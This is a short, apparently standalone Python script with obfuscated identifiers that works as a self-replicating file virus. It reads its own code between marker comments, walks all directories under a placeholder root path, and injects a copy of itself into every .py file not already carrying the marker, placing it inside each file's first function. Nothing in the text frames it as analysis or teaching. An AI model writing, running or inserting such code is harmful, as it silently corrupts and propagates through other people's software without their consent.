def run():
	#GKLWXaU
	import os,fnmatch,sys
	VCFbW = []
	with open(sys.argv[0]) as hnFix:
		kSvMb = hnFix.readlines()
	PUFjr = False
	for wMPvH in kSvMb:
		if '#GKLWXaU' in wMPvH and '#asdf' not in wMPvH: #asdf
			if PUFjr:
				PUFjr = False
			else:
				PUFjr = True
		if PUFjr:
			VCFbW.append(wMPvH)
	VCFbW.append('\n#GKLWXaU\n') #asdf
	YBhKV = []
	for wGJNS, DCVST, COnOF in os.walk('/CHANGE ME TO ROOT'):
		for ebgtJ in COnOF:
			if fnmatch.fnmatch(ebgtJ, '*.py'):
				YBhKV.append(os.path.join(wGJNS, ebgtJ))
	acpvY = []
	for MOyNd in YBhKV:
		with open(MOyNd) as hnFix:
			kSvMb = hnFix.readlines()
		HkeeE = False
		for wMPvH in kSvMb:
			if '#GKLWXaU' in wMPvH: #asdf
				HkeeE = True
		if HkeeE:
			continue
		acpvY = []
		bjtGG = True
		for wMPvH in kSvMb:
			acpvY.append(wMPvH)
			if bjtGG and 'def ' in wMPvH and '):' in wMPvH:
				index = wMPvH.index('def ')
				iWmHo = wMPvH[0:index]
				for CBEJO in VCFbW:
					acpvY.append(iWmHo + CBEJO)
				bjtGG = False
		with open(MOyNd, mode='w') as hnFix:
			for wMPvH in acpvY:
					hnFix.write(wMPvH)
	#GKLWXaU
run()
